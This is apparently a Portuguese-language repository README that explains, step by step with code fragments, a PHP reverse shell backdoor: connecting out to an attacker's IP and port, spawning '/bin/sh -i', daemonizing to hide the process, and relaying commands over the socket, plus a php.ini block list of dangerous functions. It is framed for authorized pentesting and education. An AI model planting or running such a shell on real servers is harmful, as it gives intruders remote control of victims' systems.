
# 🐚 PHP Reverse Shell

Este repositório contém um script de **shell reversa em PHP**, adaptado e comentado em português, ideal para fins educacionais e testes de segurança autorizados.

---

## ⚠️ AVISO IMPORTANTE

Este código é **potencialmente perigoso** e pode ser utilizado de forma maliciosa. No entanto, ele também tem **aplicações legítimas** em testes de intrusão (pentest), auditorias de segurança e simulações ofensivas.

> ❗ **Nunca utilize este tipo de código em sistemas sem permissão explícita.**  
> O uso indevido pode violar leis locais e internacionais.  
> O autor **não se responsabiliza** por qualquer dano ou uso indevido.

---

## 🔍 O que o código faz — Explicado passo a passo

Este código é uma shell reversa, ou seja, um tipo de **backdoor** que faz com que o servidor PHP (vítima) se conecte a outro computador (atacante), oferecendo um terminal remoto com o mesmo privilégio do processo PHP (normalmente `www-data`, `apache`, etc.).

### 1. Configuração Inicial

```php
set_time_limit(0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // IP do atacante - deve ser alterado
$port = 1234;       // Porta do atacante - deve ser alterada
```

- `set_time_limit(0)` → desativa o limite de tempo do script (ele roda indefinidamente).
- `$ip` e `$port` → definem para onde o script PHP irá se conectar.

---

### 2. Comando Inicial

```php
$shell = 'uname -a; w; id; /bin/sh -i';
```

- Executa comandos úteis para identificar o sistema e depois inicia um shell interativo:
  - `uname -a` → informações do sistema operacional.
  - `w` → usuários logados.
  - `id` → UID e grupos do processo.
  - `/bin/sh -i` → shell interativo.

---

### 3. Daemonização (opcional)

```php
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    ...
}
```

- Se possível, transforma o script em **daemon** (processo de segundo plano):
  - Oculta o processo.
  - Evita "zombies".
- Caso não seja possível, ele continua normalmente e exibe um aviso.

---

### 4. Conexão com o atacante

```php
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
```

- Abre uma conexão TCP para o IP/porta do atacante.
- Esse será o canal reverso para o shell.
- Se falhar, o script termina.

---

### 5. Execução do processo do shell

```php
$process = proc_open($shell, $descriptorspec, $pipes);
```

- Inicia um processo `/bin/sh -i` com entrada e saída redirecionadas para pipes.
- Permite redirecionar comandos e saídas via socket TCP.

---

### 6. Torna os streams não bloqueantes

```php
stream_set_blocking(..., 0);
```

- Evita que o script fique travado aguardando leitura ou escrita em um stream.

---

### 7. Loop de comunicação

```php
while (1) {
    ...
}
```

- Loop infinito que:
  - Lê dados do socket (comandos do atacante) → envia ao shell.
  - Lê saída do shell → envia de volta ao socket.
- Atua como um **proxy de terminal interativo** entre vítima e atacante.

---

### 8. Encerramento limpo

- Fecha todos os pipes, socket e termina o processo:
```php
fclose(...);
proc_close(...);
```

---

### 9. Função `printit()`

```php
function printit($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
```

- Exibe mensagens de log no terminal **apenas se não estiver daemonizado**.
- Útil para depuração ou execução manual.

---

## ✅ Exemplos de uso legítimo

- Testes de segurança (pentest) com permissão da empresa/cliente.
- Simulações de ataque para avaliar respostas de segurança.
- Análises forenses e educacionais.

---

## 💡 Conclusão Técnica

Este script:

- Cria um canal de comunicação reverso (inbound no atacante, outbound na vítima).
- Permite execução remota de comandos em tempo real.
- Não depende que a vítima tenha portas abertas — apenas que o PHP tenha funções habilitadas.
- Muito útil em exploração de vulnerabilidades como RCE, LFI+log poisoning ou upload malicioso.

---

## 🛡️ Proteção recomendada

No `php.ini`, desative funções perigosas para evitar exploração:

```ini
disable_functions = proc_open, shell_exec, system, passthru, exec, popen, fsockopen
```

---

## 🧑‍💻 Autor

- Jadson Lima: [h4ckthreat](mailto:h4ckthreat@gmail.com)

---

## 📄 Licença

Distribuído sob a [GNU GPL v2](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html).
